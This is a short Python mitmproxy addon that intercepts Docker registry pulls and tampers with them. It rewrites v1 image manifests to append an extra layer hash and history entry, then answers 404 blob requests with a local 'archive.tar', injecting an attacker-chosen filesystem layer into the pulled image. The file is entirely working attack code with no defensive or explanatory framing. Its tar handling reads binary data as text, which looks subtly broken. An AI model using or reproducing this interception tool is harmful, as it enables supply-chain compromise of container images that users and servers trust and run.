import typing
import json
import mitmproxy.http
from mitmproxy import ctx


class DockerLayerInserter:

    def response(self, flow: mitmproxy.http.HTTPFlow):
        if flow.response.headers['Content-Type'].find("application/vnd.docker.distribution.manifest.v1+prettyjws") != -1:
            t = flow.response.content.decode('utf-8')
            # ctx.log.info(t)
            j = json.loads(t)
            j['fsLayers'].append({'blobSum': 'sha256:ffb46dc0f90b1af95646e67699d537a4ae53cfc9de085633f866a90436bb0700'})
            j['history'].append(j['history'][-1])
            flow.response.content = bytes(json.dumps(j).encode('utf-8'))

        if flow.response.status_code == 404:
            with open('archive.tar') as f:
                flow.response.content = bytes(f.read().encode('utf-8'))
                flow.response.headers['Content-Length'] = "{}".format(len(flow.response.content))
                flow.response.status_code = 200
                flow.response.reason = 'OK'


addons = [
    DockerLayerInserter()
]
